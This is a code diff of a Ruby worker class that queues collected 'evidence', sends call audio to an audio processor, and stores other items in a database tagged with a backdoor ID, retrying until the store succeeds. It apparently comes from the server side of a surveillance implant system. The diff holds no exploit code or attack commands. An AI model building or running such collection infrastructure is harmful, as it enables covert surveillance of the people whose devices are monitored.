@@ -12,7 +12,7 @@ module Worker
 
 class InstanceProcessor
   include RCS::Tracer
-
+  
   SLEEP_TIME = 10
   
   def initialize(id)
@@ -61,9 +61,9 @@ class InstanceProcessor
     @seconds_sleeping >= SLEEP_TIME
   end
   
-  def queue(evidence)
-    @evidences << evidence unless evidence.nil?
-    trace :info, "queueing #{evidence} for #{@id}"
+  def queue(id)
+    @evidences << id unless id.nil?
+    trace :info, "queueing #{id} for #{@id}"
     
     process = Proc.new do
       resume
@@ -88,11 +88,24 @@ class InstanceProcessor
               when :CALL
                 @audio_processor.feed(evidence)
               else
-                RCS::DB::DB.evidence_store(evidence)
+                done = false
+                until done
+                  begin
+                    evidence.info[:backdoor_id] = RCS::EvidenceManager.instance_info(@id)["bid"]
+                    RCS::DB::DB.evidence_store(evidence)
+                    RCS::EvidenceManager.del_evidence(evidence_id, @id)
+                    done = true
+                  rescue Exception => e
+                    trace :debug, "[#{Thread.current}][#{@id}] DB seems down, waiting for it to resume ... [#{e.message}]"
+                    sleep 1
+                  end
+                end
+                
+              # TODO: delete evidence if store was successful
             end
             
-            trace :debug, "[#{Thread.current}][#{@id}] processed #{evidence_id} of type #{evidence.type}, #{data.size} bytes."
-            
+            trace :debug, "[#{Thread.current}][#{@id}] processed #{evidence_id} of type #{evidence.info[:type]}, #{data.size} bytes."
+          
           rescue EvidenceDeserializeError => e
             trace :info, "[#{Thread.current}][#{@id}] decoding failed for #{evidence_id}: " << e.to_s
             # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
